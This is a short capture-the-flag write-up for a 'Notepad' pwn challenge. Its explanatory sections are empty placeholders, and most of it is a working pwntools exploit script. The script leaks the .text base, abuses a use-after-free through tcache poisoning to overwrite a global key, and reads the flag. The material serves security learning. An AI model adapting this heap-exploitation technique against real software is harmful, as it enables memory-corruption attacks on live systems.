# 1337 Up | Notepad - PWN (100)

Challenge involved getting a `.text` leak at the start of main. After that exploit the use-after-free vulnerability using tcache poisoning to modify the global variable `key` and read the flag.

## Initial Analysis
How to get the building blocks of ideas for exploitation

## Exploitation
How to exploit after initial analysis

## Solve
``` python
from pwn import *

BINARY = './notepad'
HOST = ''
GDB_SCRIPT = ''

def add_note(proc, index, data):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b'> ', index)
    proc.sendlineafter(b'> ', b'16')
    proc.sendlineafter(b'> ', data)

def del_note(proc, index):
    proc.sendlineafter(b'> ', b'4')
    proc.sendlineafter(b'> ', index)

def main():
    proc = get_process() # set is_remote = False for local testing
    
    # Use main() leak to calculate .text base
    proc.recvuntil(b'Here a gift: ')
    leak = proc.recvline().strip().decode()
    leak_address = int(leak, 16)
    main_address = 0x0010119a
    base_address = leak_address - main_address
    
    # Warm up tcache      
    add_note(proc, b'1', b'chunk1')
    add_note(proc, b'2', b'chunk2')
    del_note(proc, b'1')
    del_note(proc, b'2')
    
    # Use .text base to get key address
    key_addr = 0x0030204c + base_address
    payload = b''.join([
        b'A'*0x18,
        p64(0x21),
        p64(key_addr)
    ])
    
    # Exploit use-after-free by tcache poisoning
    proc.sendlineafter(b'> ', b'3') # edit note
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b'> ', payload) # overwrite chunks
    
    # Modify key variable with 0xcafebabe
    add_note(proc, b'3', b'chunk2')
    add_note(proc, b'4', p64(0xcafebabe))
    
    # Print flag
    proc.sendlineafter(b'> ', b'5') # request secret note
    flag = proc.recvall().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```